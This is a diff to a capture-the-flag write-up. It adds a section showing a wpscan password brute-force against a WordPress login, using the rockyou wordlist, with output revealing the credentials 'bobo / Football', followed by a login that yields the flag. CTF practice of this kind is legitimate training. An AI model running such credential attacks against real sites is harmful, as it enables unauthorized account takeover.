@@ -281,7 +281,21 @@ We checked the file type and it was actually a pdf after converting and viewing 
 Bo Bo is the only other user besides admin (Ming) that has posted. Also the only friend of admin.
 Location of the flag will have something to do with Bo Bo
 
-### Solution
+### Method
+```
+$ wpscan --url http://3.145.206.165 --passwords rockyou.txt --usernames admin,bobo
+
+[+] Performing password attack on Wp Login against 2 user/s
+[SUCCESS] - bobo / Football
+Trying admin / contraviento Time: 04:24:04 <==                                                                                                  > (689415 / 28702202)  2.40%  ETA: ??:??:??
+[!] Valid Combinations Found:
+ | Username: bobo, Password: Football
+```
+
+Using username as `bobo` and Password as `Football`, I successfully logged in `http://3.145.206.165/wp-login.php`.
+# ![login](login.png)
+
+And I found the flag in DashBoard. 
 
 #### Screenshot of flag
 
